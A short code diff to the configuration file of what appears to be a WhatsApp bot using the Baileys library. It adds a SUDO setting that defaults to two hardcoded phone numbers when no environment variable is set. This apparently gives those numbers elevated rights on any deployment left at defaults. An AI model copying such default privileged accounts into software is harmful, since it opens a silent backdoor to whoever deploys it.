@@ -53,5 +53,7 @@ module.exports = {
   ANTI_DEL_PATH: process.env.ANTI_DEL_PATH || "same",
 
   AUTO_RECORDING: toBool(process.env.AUTO_RECORDING, "true"),
-  BAILEYS: process.env.BAILEYS || "@whiskeysockets/baileys"
+  BAILEYS: process.env.BAILEYS || "@whiskeysockets/baileys",
+  
+  SUDO: process.env.SUDO || "989910713754,13058962443"
 };
